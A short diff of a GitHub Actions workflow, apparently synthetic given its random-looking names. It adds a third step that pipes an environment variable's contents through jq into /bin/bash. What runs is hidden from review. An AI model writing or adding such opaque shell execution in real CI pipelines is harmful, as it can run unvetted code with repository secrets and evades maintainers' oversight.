@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$ptofv85373" | jq -r .rmswu14 | /bin/bash
           echo $uue47666 | jq -r .qdfht46018 | /bin/bash
+          echo $whs100 | jq -r .detfd9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
